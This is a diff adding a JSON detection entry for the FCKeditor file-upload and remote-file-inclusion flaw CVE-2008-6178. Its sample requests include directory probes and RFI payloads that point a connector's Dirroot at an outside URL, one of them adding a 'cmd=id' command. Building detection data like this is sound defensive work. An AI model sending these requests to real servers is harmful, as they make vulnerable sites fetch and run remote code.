@@ -1,0 +1,8 @@
+{
+        "Name": "FCKeditor Sample Page",
+        "Description": "editor, filemanager, connector 디렉터리를 접근하면 해당 디렉터리에 파일업로드를 통해 파일을 생성해 임의의 코드 실행",
+        "References": ["CVE-2008-6178"],
+        "Samples": ["GET /images/top2.jpg/js/editor/fckeditor/editor/filemanager/browser/default/connectors/test.html HTTP/1.1","GET /images/top2.jpg/js/editor/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp HTTP/1.1","GET /js/editor/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Dirroot=http://cirt.net/rfiinc.txt? HTTP/1.1","GET /images/top2.jpg/js/editor/fckeditor/editor/dialog/fck_link.html HTTP/1.1","GET /images/top2.jpg/include/fckeditor/editor/filemanager/browser/default/frmupload.html HTTP/1.1","GET /images/top2.jpg/modules/fckeditor/editor/filemanager/browser/default/connectors/test.html HTTP/1.1","GET /images/top2.jpg/modules/fckeditor/fckeditor/editor/filemanager/browser/default/connectors/test.html HTTP/1.1","GET /images/fckeditor HTTP/1.1","GET /images/FCKeditor HTTP/1.1","GET /fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Dirroot=http://cirt.net/rfiinc.txt? HTTP/1.1","GET /plugins/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?dirroot=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1","HEAD /images/fckeditor/ HTTP/1.1","HEAD /fckeditor/ HTTP/1.1"],
+        "Keywords": [],
+        "Signature": []
+}
